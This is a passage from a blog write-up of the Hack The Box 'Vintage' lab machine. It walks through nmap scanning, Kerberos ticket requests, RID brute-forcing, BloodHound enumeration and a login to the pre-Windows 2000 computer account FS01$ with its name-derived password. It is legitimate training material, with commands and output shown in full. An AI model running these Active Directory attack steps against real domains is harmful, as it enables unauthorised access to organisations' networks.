@@ -1,0 +1,826 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="This is my writeup of Vintage Windows Box From Hack The Box **(Hard)**"><title>Vintage HTB Writeup</title><link rel=canonical href=https://r4z1o.github.io/p/vintage-htb-writeup/><link rel=stylesheet href=/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css><meta property='og:title' content="Vintage HTB Writeup"><meta property='og:description' content="This is my writeup of Vintage Windows Box From Hack The Box **(Hard)**"><meta property='og:url' content='https://r4z1o.github.io/p/vintage-htb-writeup/'><meta property='og:site_name' content='     R4zi0'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='markdown'><meta property='article:tag' content='css'><meta property='article:tag' content='html'><meta property='article:tag' content='themes'><meta property='article:published_time' content='2025-03-01T00:00:00+00:00'><meta property='article:modified_time' content='2025-03-01T00:00:00+00:00'><meta property='og:image' content='https://r4z1o.github.io/p/vintage-htb-writeup/Vintage.png'><meta name=twitter:title content="Vintage HTB Writeup"><meta name=twitter:description content="This is my writeup of Vintage Windows Box From Hack The Box **(Hard)**"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://r4z1o.github.io/p/vintage-htb-writeup/Vintage.png'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_8e81efca82e23b50.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🍥</span></figure><div class=site-meta><h1 class=site-name><a href=/>R4zi0</a></h1><h2 class=site-description>Cyber Security Student | Offensive Security Enthusiast</h2></div></header><ol class=menu-social><li><a href=https://github.com/R4z1o target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/vintage-htb-writeup/><img src=/p/vintage-htb-writeup/Vintage_hu_b113802d402cabc7.png srcset="/p/vintage-htb-writeup/Vintage_hu_b113802d402cabc7.png 800w, /p/vintage-htb-writeup/Vintage_hu_6f23b945c8c76afc.png 1600w" width=800 height=287 loading=lazy alt="Featured image of post Vintage HTB Writeup"></a></div><div class=article-details><header class=article-category><a href=/categories/themes/>Themes
+</a><a href=/categories/syntax/>Syntax</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/vintage-htb-writeup/>Vintage HTB Writeup</a></h2><h3 class=article-subtitle>This is my writeup of Vintage Windows Box From Hack The Box **(Hard)**</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Mar 01, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>15 minute read</time></div></footer></div></header><section class=article-content><p>This is one of the Boxes that took me a week to solve, but the amount of the information that i learned from it is unbelievable</p><p>As always we start our assessment with a port comprehensive scan that reveals the following results :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap -v -sV -sC -O -Pn --disable-arp-ping -p- -o Broad-scan-nmap 10.10.11.45
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.45
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.073s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>65517</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT      STATE SERVICE       VERSION
+</span></span><span class=line><span class=cl>53/tcp    open  domain        Simple DNS Plus
+</span></span><span class=line><span class=cl>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class=o>(</span>server time: 2025-02-17 03:07:34Z<span class=o>)</span>
+</span></span><span class=line><span class=cl>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class=line><span class=cl>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: vintage.htb0., Site: Default-First-Site-Name<span class=o>)</span>
+</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds?
+</span></span><span class=line><span class=cl>464/tcp   open  kpasswd5?
+</span></span><span class=line><span class=cl>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class=line><span class=cl>636/tcp   open  tcpwrapped
+</span></span><span class=line><span class=cl>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: vintage.htb0., Site: Default-First-Site-Name<span class=o>)</span>
+</span></span><span class=line><span class=cl>3269/tcp  open  tcpwrapped
+</span></span><span class=line><span class=cl>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Not Found
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class=line><span class=cl>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span class=line><span class=cl>49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class=line><span class=cl>49668/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class=line><span class=cl>49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class=line><span class=cl>49685/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class=line><span class=cl>51973/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class=line><span class=cl>Warning: OSScan results may be unreliable because we could not find at least <span class=m>1</span> open and <span class=m>1</span> closed port
+</span></span><span class=line><span class=cl>Device type: general purpose
+</span></span><span class=line><span class=cl>Running <span class=o>(</span>JUST GUESSING<span class=o>)</span>: Microsoft Windows <span class=m>2022</span> <span class=o>(</span>89%<span class=o>)</span>
+</span></span><span class=line><span class=cl>Aggressive OS guesses: Microsoft Windows Server <span class=m>2022</span> <span class=o>(</span>89%<span class=o>)</span>
+</span></span><span class=line><span class=cl>No exact OS matches <span class=k>for</span> host <span class=o>(</span><span class=nb>test</span> conditions non-ideal<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Uptime guess: 0.008 days <span class=o>(</span>since Mon Feb <span class=m>17</span> 03:57:14 2025<span class=o>)</span>
+</span></span><span class=line><span class=cl>TCP Sequence Prediction: <span class=nv>Difficulty</span><span class=o>=</span><span class=m>263</span> <span class=o>(</span>Good luck!<span class=o>)</span>
+</span></span><span class=line><span class=cl>IP ID Sequence Generation: Incremental
+</span></span><span class=line><span class=cl>Service Info: Host: DC01<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Host script results:
+</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   3:1:1: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled and required
+</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2025-02-17T03:08:34
+</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
+</span></span></code></pre></td></tr></table></div></div><p>As it appears SMB <code>port :445</code>, LDAP <code>port :389</code> and Kerberos <code>port :88</code> are open in the box which indicate that this is a Domains Controller. The results above show the domain under which this Server is <code>vintage.htb</code> .</p><p>As always i tried running NXC using the provided credentials <code>P.Rosa</code>:<code>Rosaisbest123</code> and the <code>DC01.vintage.htb</code> seems to be the DNS Name of the box, but it seems that it is encountering some issue.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo netexec smb 10.10.11.45 -u P.Rosa -p Rosaisbest123    
+</span></span><span class=line><span class=cl>SMB         10.10.11.45     <span class=m>445</span>    10.10.11.45      <span class=o>[</span>*<span class=o>]</span>  x64 <span class=o>(</span>name:10.10.11.45<span class=o>)</span> <span class=o>(</span>domain:10.10.11.45<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
+</span></span><span class=line><span class=cl>SMB         10.10.11.45     <span class=m>445</span>    10.10.11.45      <span class=o>[</span>-<span class=o>]</span> 10.10.11.45<span class=se>\P</span>.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo netexec ldap 10.10.11.45 -u P.Rosa -p Rosaisbest123   
+</span></span><span class=line><span class=cl>LDAP        10.10.11.45     <span class=m>389</span>    dc01.vintage.htb <span class=o>[</span>*<span class=o>]</span>  x64 <span class=o>(</span>name:dc01.vintage.htb<span class=o>)</span> <span class=o>(</span>domain:vintage.htb<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
+</span></span><span class=line><span class=cl>LDAP        10.10.11.45     <span class=m>389</span>    dc01.vintage.htb <span class=o>[</span>-<span class=o>]</span> vintage.htb<span class=se>\P</span>.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED
+</span></span></code></pre></td></tr></table></div></div><p>This took me a lot of time to figure out. i even thought this is some VPN issue or connection problem, so i googled it and i found this <a class=link href=https://gist.github.com/mpgn/9fc08b0f0fde55e8c322518bc1f9c317 target=_blank rel=noopener>Scrambled vs NetExec</a> for someone encountering the same problem on a different HTB Box, and the <code>netexec</code> feedback information is <code>STATUS_NOT_SUPPORTED</code>, indicate that NTLM Authentication is disabled.</p><p>For that we will resort to Kerberos Authentication, by obtaining a TGT and export it to the <code>KRB5CCNAME</code> environment variable.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ getTGT.py vintage.htb/P.Rosa:<span class=s1>&#39;Rosaisbest123&#39;</span> -dc-ip dc01.vintage.htb
+</span></span><span class=line><span class=cl>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving ticket in P.Rosa.ccache
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ <span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>P.Rosa.ccache
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ klist
+</span></span><span class=line><span class=cl>Ticket cache: FILE:P.Rosa.ccache
+</span></span><span class=line><span class=cl>Default principal: P.Rosa@VINTAGE.HTB
+</span></span><span class=line><span class=cl>Valid starting     Expires            Service principal
+</span></span><span class=line><span class=cl>03/17/25 03:51:04  03/17/25 13:51:04  krbtgt/VINTAGE.HTB@VINTAGE.HTB
+</span></span><span class=line><span class=cl>	renew <span class=k>until</span> 03/18/25 03:51:04
+</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s test it out, and it seems to be good!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo netexec smb dc01.vintage.htb -u P.Rosa -d vintage.htb -k --use-kcache         
+</span></span><span class=line><span class=cl>SMB         dc01.vintage.htb <span class=m>445</span>    dc01             <span class=o>[</span>*<span class=o>]</span>  x64 <span class=o>(</span>name:dc01<span class=o>)</span> <span class=o>(</span>domain:vintage.htb<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
+</span></span><span class=line><span class=cl>SMB         dc01.vintage.htb <span class=m>445</span>    dc01             <span class=o>[</span>+<span class=o>]</span> vintage.htb<span class=se>\P</span>.Rosa from ccache 
+</span></span></code></pre></td></tr></table></div></div><p>I used <code>netexec</code> to enumerate user and computer accounts through the <code>--rid-kcache</code> flag, so i saw <code>gMSA01$</code> and i immediately though about <code>ReadGMSAPassword</code> ACL which is relevant for these service accounts.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ netexec smb dc01.vintage.htb -d vintage.htb -u P.Rosa -k --use-kcache --rid-brute<span class=p>|</span> grep SidTypeUser <span class=p>|</span> cut -d: -f2 <span class=p>|</span> cut -d <span class=se>\\</span> -f2 <span class=p>|</span> cut -d<span class=s1>&#39; &#39;</span> -f1            
+</span></span><span class=line><span class=cl>Administrator
+</span></span><span class=line><span class=cl>Guest
+</span></span><span class=line><span class=cl>krbtgt
+</span></span><span class=line><span class=cl>DC01$
+</span></span><span class=line><span class=cl>gMSA01$
+</span></span><span class=line><span class=cl>FS01$
+</span></span><span class=line><span class=cl>M.Rossi
+</span></span><span class=line><span class=cl>R.Verdi
+</span></span><span class=line><span class=cl>L.Bianchi
+</span></span><span class=line><span class=cl>G.Viola
+</span></span><span class=line><span class=cl>C.Neri
+</span></span><span class=line><span class=cl>P.Rosa
+</span></span><span class=line><span class=cl>svc_sql
+</span></span><span class=line><span class=cl>svc_ldap
+</span></span><span class=line><span class=cl>svc_ark
+</span></span><span class=line><span class=cl>C.Neri_adm
+</span></span><span class=line><span class=cl>L.Bianchi_adm
+</span></span></code></pre></td></tr></table></div></div><p>I collected data using <code>bloodhound-python</code> and ingest it to <code>Bloodhound</code> using the TGT.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage/bloodhound1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# bloodhound-python -u P.Rosa -p <span class=s1>&#39;Rosaisbest123&#39;</span> -d vintage.htb -dc dc01.vintage.htb -c All             
+</span></span><span class=line><span class=cl>INFO: Found AD domain: vintage.htb
+</span></span><span class=line><span class=cl>INFO: Getting TGT <span class=k>for</span> user
+</span></span><span class=line><span class=cl>INFO: Connecting to LDAP server: dc01.vintage.htb
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>1</span> domains
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>1</span> domains in the forest
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>2</span> computers
+</span></span><span class=line><span class=cl>INFO: Connecting to LDAP server: dc01.vintage.htb
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>16</span> users
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>58</span> groups
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>2</span> gpos
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>2</span> ous
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>19</span> containers
+</span></span><span class=line><span class=cl>INFO: Found <span class=m>0</span> trusts
+</span></span><span class=line><span class=cl>INFO: Starting computer enumeration with <span class=m>10</span> workers
+</span></span><span class=line><span class=cl>INFO: Querying computer: FS01.vintage.htb
+</span></span><span class=line><span class=cl>INFO: Querying computer: dc01.vintage.htb
+</span></span></code></pre></td></tr></table></div></div><p>I used this custom Cypher query to get accounts that have Read access of <code>GMSA01$</code>&rsquo;s password, and <code>Domain Computers</code> Group have that Right.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>MATCH <span class=nv>p</span><span class=o>=</span><span class=m>0</span> <span class=o>[</span>: ReadCMSAPassword<span class=o>]</span> &gt;0 RETURN p
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/vintage-htb-writeup/Bloodhound1.png width=616 height=303 srcset="/p/vintage-htb-writeup/Bloodhound1_hu_e5fba866522fc62f.png 480w, /p/vintage-htb-writeup/Bloodhound1_hu_42ab26f932763733.png 1024w" loading=lazy alt=Bloodhound class=gallery-image data-flex-grow=203 data-flex-basis=487px></p><p><code>Domain Computers</code> Group have <code>FS01$</code> as a member, which seems to be a File Server account.</p><p><img src=/p/vintage-htb-writeup/Bloodhound2.png width=645 height=272 srcset="/p/vintage-htb-writeup/Bloodhound2_hu_d5876f4055e79af0.png 480w, /p/vintage-htb-writeup/Bloodhound2_hu_4058964271bd5c0b.png 1024w" loading=lazy alt=Bloodhound class=gallery-image data-flex-grow=237 data-flex-basis=569px></p><p>The <code>FS01$</code> is part of the <code>Pre-Windows 2000 Compatible computer Access</code> Group.</p><p><img src=/p/vintage-htb-writeup/Bloodhound3.png width=701 height=279 srcset="/p/vintage-htb-writeup/Bloodhound3_hu_4b71e779bdfa6f78.png 480w, /p/vintage-htb-writeup/Bloodhound3_hu_19c4138979e6f11d.png 1024w" loading=lazy alt=Bloodhound class=gallery-image data-flex-grow=251 data-flex-basis=603px></p><p>This got me thinking about one <a class=link href=https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts target=_blank rel=noopener>Blog</a> that i read which say that : <code>When a new computer account is configured as "Pre-Windows 2000 computer", its password is set based on its name (i.e. lowercase computer name without the trailing </code>$<code>). When it isn't, the password is randomly generated.</code></p><p>So, i tried the <code>fs01</code> as a password and it did actually works.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo netexec ldap vintage.htb -u <span class=s1>&#39;FS01$&#39;</span> -p fs01 -k
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>LDAP        vintage.htb     <span class=m>389</span>    dc01.vintage.htb <span class=o>[</span>*<span class=o>]</span>  x64 <span class=o>(</span>name:dc01.vintage.htb<span class=o>)</span> <span class=o>(</span>domain:vintage.htb<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
+</span></span><span class=line><span class=cl>LDAP        vintage.htb     <span class=m>389</span>    dc01.vintage.htb <span class=o>[</span>+<span class=o>]</span> vintage.htb<span class=se>\F</span>S01$:fs01 
+</span></span></code></pre></td></tr></table></div></div><p>I used the <code>getTGT.py</code> to generate a ticket to authenticate as <code>FS01$</code> and export it to the <code>KRB5CCNAME</code> to use it further.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Vintage<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ getTGT.py -dc-ip 10.10.11.45 vintage.htb/FS01$:fs01 
